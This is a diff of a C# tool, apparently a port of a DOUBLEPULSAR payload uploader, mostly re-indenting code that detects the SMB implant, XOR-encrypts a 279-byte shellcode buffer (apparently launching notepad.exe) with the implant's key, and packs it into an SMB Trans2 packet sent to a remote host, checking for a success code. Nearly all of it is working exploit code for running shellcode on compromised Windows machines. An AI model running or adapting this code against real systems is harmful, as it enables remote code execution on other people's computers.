@@ -399,7 +399,7 @@ namespace DoublePulsar
             List<byte> Parameters = new List<byte>();
             Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
             byte[] paramz = Parameters.ToArray();
-            
+
             byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
             byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
             pkt = pkt.Concat(paramz.ToArray()).ToArray();
@@ -497,7 +497,7 @@ namespace DoublePulsar
             Marshal.FreeHGlobal(ptr);
             return str;
         }
-        
+
         public static string HexDump(byte[] bytes, int bytesPerLine = 16)
         {
             if (bytes == null) return "<null>";
@@ -678,7 +678,7 @@ namespace DoublePulsar
             b += data[0];
             return b;
         }
-        
+
         //https://stackoverflow.com/questions/2350099/how-to-convert-an-int-to-a-little-endian-byte-array
         /*
         BitConverter.GetBytes(1000).Reverse<byte>().ToArray();
@@ -801,7 +801,7 @@ namespace DoublePulsar
                 string arch = calculate_doublepulsar_arch(signature_long);
 
                 Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
-                
+
                 System.Console.WriteLine("Preparing Doublepulsar payload package!");
                 //insert your shellcode here
                 byte[] buf = new byte[279] {
@@ -824,170 +824,172 @@ namespace DoublePulsar
                   0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                   0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
                   0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
-                    byte[] shellcode = MakeKernelUserPayload(buf);
-                    System.Console.WriteLine("Generating shellcode buffer!");
-                
-                    byte[] ByteXORKEY = INT2LE(key);
+                byte[] shellcode = MakeKernelUserPayload(buf);
+                System.Console.WriteLine("Generating shellcode buffer!");
 
-                    int shellcode_len = shellcode.Length;
+                byte[] ByteXORKEY = INT2LE(key);
 
-                    byte[] SC = new byte[shellcode_len];
-                    Array.Clear(SC, 0, shellcode_len);
-                    Array.Copy(shellcode, SC, shellcode.Length);
-                    System.Console.WriteLine("Shellcode buffer...\n");
-                    System.Console.WriteLine(HexDump(SC));
+                int shellcode_len = shellcode.Length;
 
-                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer with XOR key");
-                    System.Console.WriteLine("Encrypting shellcode buffer...\n");
-                    for (Int32 i = 0; i < SC.Length; i++)
+                byte[] SC = new byte[shellcode_len];
+                Array.Clear(SC, 0, shellcode_len);
+                Array.Copy(shellcode, SC, shellcode.Length);
+                System.Console.WriteLine("Shellcode buffer...\n");
+                System.Console.WriteLine(HexDump(SC));
+
+                System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer with XOR key");
+                System.Console.WriteLine("Encrypting shellcode buffer...\n");
+                for (Int32 i = 0; i < SC.Length; i++)
+                {
+                    SC[i] ^= (byte)ByteXORKEY[i % 4];
+                }
+
+                System.Console.WriteLine(HexDump(SC));
+
+                System.Console.WriteLine("Generating the Doublepulsar parameters...\n");
+                List<byte> Parameters = new List<byte>();
+                Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
+
+                //convert params to byte
+                //byte[] paramBytes = GetBytes(Parameters);
+                byte[] paramz = Parameters.ToArray();
+                UInt32 TotalByteCount = (uint)SC.Length;
+                UInt32 ChunkSize = (uint)SC.Length;
+                UInt32 Offset = 0;
+
+                byte[] ByteTotalByteCount = INT2LE(TotalByteCount);
+                byte[] ByteChunkSize = INT2LE(ChunkSize);
+                byte[] ByteOffset = INT2LE(Offset);
+
+                System.Buffer.BlockCopy(ByteTotalByteCount, 0, paramz, 0, 4);
+                System.Buffer.BlockCopy(ByteChunkSize, 0, paramz, 4, 4);
+                System.Buffer.BlockCopy(ByteOffset, 0, paramz, 8, 4);
+
+                System.Console.WriteLine("Parameters before encryption...\n");
+                System.Console.WriteLine(HexDump(paramz));
+
+                System.Console.WriteLine("Encrypting parameters...\n");
+                for (Int32 i = 0; i < paramz.Length; i++)
+                {
+                    paramz[i] ^= (byte)ByteXORKEY[i % 4];
+                }
+                System.Console.WriteLine("Parameters after XOR Encryption...\n");
+                System.Console.WriteLine(HexDump(paramz));
+                System.Console.WriteLine("[+] [{ip}] { HexDump(paramz) }");
+
+                SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
+                {
+                    WordCount = 15,
+                    TotalParameterCount = 12,
+                    TotalDataCount = 0x1000,
+                    MaxParameterCount = 1,
+                    MaxDataCount = 0x0000,
+                    MaxSetupCount = 0x00,
+                    Reserved = 0x00,
+                    Flags = 0x00,
+                    Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
+                    Reserved2 = 0x00,
+                    ParameterCount = 12,
+
+                    //where in the packet is the location of the parameters
+                    //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
+                    ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
+                    DataCount = 0, //will be updated with the values below
+
+                    //where in the packet is the location of the SMBDATA
+                    //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
+                    DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
+                    setupcount = 1, //0x01;
+                    reserved3 = 0x00,
+                    subcommand = 0x000E,
+                    ByteCount = 0,
+                    padding = 0x00
+                };
+
+                SMB_HEADER Exec_header = new SMB_HEADER
+                {
+                    protocol = 0x424d53ff,
+                    command = 0x32,
+                    errorClass = 0x00,
+                    _reserved = 0x00,
+                    errorCode = 0x0000,
+                    flags = 0x18,
+                    flags2 = 0xc007,
+                    PIDHigh = 0x0000,
+                    SecurityFeatures = 0x0000000000000000,
+                    reserved = 0x0000,
+                    TID = 0xfeff,     //need this value from previous exchanges
+                    PIDLow = 0xfeff,  //PIDLow = 0x4b2f,
+                    UID = 0x0008,     //need this value from previous exchanges
+                    MID = 0x0042
+                };
+
+                Exec_header.TID = header.TID;
+                Exec_header.UID = header.UID;
+
+                //Merge SMBHeader with the transaction2SecondaryRequest
+                byte[] headerBytes = GetBytes(Exec_header);
+
+                transaction2SecondaryRequest.TotalDataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
+                transaction2SecondaryRequest.DataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
+
+                ushort byteCountOfEncryptedPayload = (ushort)(SC.Length + 13); // Marshal.SizeOf(encrypted_payload) + 13;
+                transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
+
+                byte[] transaction2SecondaryRequestbytes = GetBytes(transaction2SecondaryRequest).ToArray();
+                byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestbytes).ToArray();
+
+                System.Console.WriteLine(HexDump(pkt));
+
+                System.Console.WriteLine("Adding Doublepulsar parameters to the end");
+                //append the parameteters to the end of pkt
+                pkt = pkt.Concat(paramz.ToArray()).ToArray(); //Collect it all
+
+                System.Console.WriteLine(HexDump(pkt));
+
+                System.Console.WriteLine("Adding encrypted SMB Data to the end");
+                //append SMBData to the end of pkt
+                pkt = pkt.Concat(SC.ToArray()).ToArray(); //Collect it all
+
+                System.Console.WriteLine(HexDump(pkt));
+
+                System.Console.WriteLine("SMB packet does not have a size header.  Adding the header!");
+                uint size = (uint)pkt.Length;
+                byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
+                NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
+                netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
+                byte[] netbios_header_packet = GetBytes(netbios_header);
+                byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
+                System.Console.WriteLine(HexDump(fullMessage));
+
+                //patch user ID and tree ID here with UserID & TreeID bytes
+                //fullMessage[28] = tree_id[0];
+                //fullMessage[29] = tree_id[1];
+                //fullMessage[32] = user_id[0];
+                //fullMessage[33] = user_id[1];
+
+                try
+                {
+                    sock.Send(fullMessage);
+                    System.Console.WriteLine("Sent a packet!");
+                    sock.Receive(buf, 1024, SocketFlags.None);
+                    header = SMB_HeaderFromBytes(buf);
+
+                    // Check for 0x52 response to indicate DOUBLEPULSAR worked
+                    // 0x52 = success
+                    // 0x62 = parameter failure
+                    // 0x72 = alloc error
+                    if (header.MID == 0x52)
                     {
-                        SC[i] ^= (byte)ByteXORKEY[i % 4];
+                        System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
                     }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Socket Error, during sending: " + e.Message);
+                }
 
-                    System.Console.WriteLine(HexDump(SC));
 
-                    System.Console.WriteLine("Generating the Doublepulsar parameters...\n");
-                    List<byte> Parameters = new List<byte>();
-                    Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
-
-                    //convert params to byte
-                    //byte[] paramBytes = GetBytes(Parameters);
-                    byte[] paramz = Parameters.ToArray();
-                    UInt32 TotalByteCount = (uint)SC.Length;
-                    UInt32 ChunkSize = (uint)SC.Length;
-                    UInt32 Offset = 0;
-
-                    byte[] ByteTotalByteCount = INT2LE(TotalByteCount);
-                    byte[] ByteChunkSize = INT2LE(ChunkSize);
-                    byte[] ByteOffset = INT2LE(Offset);
-
-                    System.Buffer.BlockCopy(ByteTotalByteCount, 0, paramz, 0, 4);
-                    System.Buffer.BlockCopy(ByteChunkSize, 0, paramz, 4, 4);
-                    System.Buffer.BlockCopy(ByteOffset, 0, paramz, 8, 4);
-
-                    System.Console.WriteLine("Parameters before encryption...\n");
-                    System.Console.WriteLine(HexDump(paramz));
-
-                    System.Console.WriteLine("Encrypting parameters...\n");
-                    for (Int32 i = 0; i < paramz.Length; i++)
-                    {
-                        paramz[i] ^= (byte)ByteXORKEY[i % 4];
-                    }
-                    System.Console.WriteLine("Parameters after XOR Encryption...\n");
-                    System.Console.WriteLine(HexDump(paramz));
-                    System.Console.WriteLine("[+] [{ip}] { HexDump(paramz) }");
-
-                    SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
-                    {
-                        WordCount = 15,
-                        TotalParameterCount = 12,
-                        TotalDataCount = 0x1000,
-                        MaxParameterCount = 1,
-                        MaxDataCount = 0x0000,
-                        MaxSetupCount = 0x00,
-                        Reserved = 0x00,
-                        Flags = 0x00,
-                        Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
-                        Reserved2 = 0x00,
-                        ParameterCount = 12,
-
-                        //where in the packet is the location of the parameters
-                        //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
-                        ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
-                        DataCount = 0, //will be updated with the values below
-
-                        //where in the packet is the location of the SMBDATA
-                        //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
-                        DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
-                        setupcount = 1, //0x01;
-                        reserved3 = 0x00,
-                        subcommand = 0x000E,
-                        ByteCount = 0,
-                        padding = 0x00
-                    };
-
-                    SMB_HEADER Exec_header = new SMB_HEADER
-                    {
-                        protocol = 0x424d53ff,
-                        command = 0x32,
-                        errorClass = 0x00,
-                        _reserved = 0x00,
-                        errorCode = 0x0000,
-                        flags = 0x18,
-                        flags2 = 0xc007,
-                        PIDHigh = 0x0000,
-                        SecurityFeatures = 0x0000000000000000,
-                        reserved = 0x0000,
-                        TID = 0xfeff,     //need this value from previous exchanges
-                        PIDLow = 0xfeff,  //PIDLow = 0x4b2f,
-                        UID = 0x0008,     //need this value from previous exchanges
-                        MID = 0x0042
-                    };
-                
-                    Exec_header.TID = header.TID;
-                    Exec_header.UID = header.UID;
-                
-                    //Merge SMBHeader with the transaction2SecondaryRequest
-                    byte[] headerBytes = GetBytes(Exec_header);
-
-                    transaction2SecondaryRequest.TotalDataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
-                    transaction2SecondaryRequest.DataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
-
-                    ushort byteCountOfEncryptedPayload = (ushort)(SC.Length + 13); // Marshal.SizeOf(encrypted_payload) + 13;
-                    transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
-
-                    byte[] transaction2SecondaryRequestbytes = GetBytes(transaction2SecondaryRequest).ToArray();
-                    byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestbytes).ToArray();
-
-                    System.Console.WriteLine(HexDump(pkt));
-
-                    System.Console.WriteLine("Adding Doublepulsar parameters to the end");
-                    //append the parameteters to the end of pkt
-                    pkt = pkt.Concat(paramz.ToArray()).ToArray(); //Collect it all
-
-                    System.Console.WriteLine(HexDump(pkt));
-
-                    System.Console.WriteLine("Adding encrypted SMB Data to the end");
-                    //append SMBData to the end of pkt
-                    pkt = pkt.Concat(SC.ToArray()).ToArray(); //Collect it all
-
-                    System.Console.WriteLine(HexDump(pkt));
-
-                    System.Console.WriteLine("SMB packet does not have a size header.  Adding the header!");
-                    uint size = (uint)pkt.Length;
-                    byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
-                    NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
-                    netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
-                    byte[] netbios_header_packet = GetBytes(netbios_header);
-                    byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
-                    System.Console.WriteLine(HexDump(fullMessage));
-
-                    //patch user ID and tree ID here with UserID & TreeID bytes
-                    fullMessage[28] = tree_id[0];
-                    fullMessage[29] = tree_id[1];
-                    fullMessage[32] = user_id[0];
-                    fullMessage[33] = user_id[1];
-
-                    try
-                    {
-                        s.Send(fullMessage);
-                        s.Receive(buf, 1024, SocketFlags.None);
-                        final_response = buf;
-                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
-                        // 0x52 = success
-                        // 0x62 = parameter failure
-                        // 0x72 = alloc error
-                        if (final_response[34] == 0x52)
-                        {
-                            System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("Socket Error, during sending: " + e.Message);
-                    }
-                
-                
                 //XorEncrypt the payload
                 //XorEncrypt(shellcode, (UInt32)key);
                 //byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);
